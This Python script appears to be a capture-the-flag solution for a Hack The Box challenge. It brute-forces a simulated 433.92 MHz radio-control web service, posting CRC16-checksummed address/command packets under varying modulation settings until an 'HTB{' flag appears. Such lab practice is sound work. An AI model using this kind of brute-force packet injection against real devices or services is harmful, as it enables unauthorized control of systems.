#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# Hacer 100 intentos diferentes
for attempt in range(100):
    if attempt % 10 == 0:
        print(f"\n[Attempt {attempt}]")
    
    s = requests.Session()
    s.get(base_url)
    
    # Variar los parámetros en cada intento
    mod = ['ASK', 'FSK', 'GFSK', 'MSK', 'OOK'][attempt % 5]
    bits = ['1', '2', '4', '8'][attempt % 4]
    
    # Enviar
    for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
        data = bytes([addr, cmd])
        crc = crc16(data)
        packet = (data + struct.pack('<H', crc)).hex().upper()
        s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': mod, 'bits': bits, 'msg': packet})
    
    time.sleep(2)
    
    # Verificar
    r = s.get(base_url)
    if 'HTB{' in r.text:
        print(f"\n[SUCCESS at attempt {attempt}]")
        print(f"  Params: mod={mod}, bits={bits}")
        print(re.findall(r'HTB\{[^}]+\}', r.text))
        break
    
    # Verificar updates
    r = s.get(f'{base_url}/updates')
    if 'HTB{' in r.text:
        print(f"\n[SUCCESS in updates at attempt {attempt}]")
        print(re.findall(r'HTB\{[^}]+\}', r.text))
        break

print("\n[*] Completed 100 attempts")
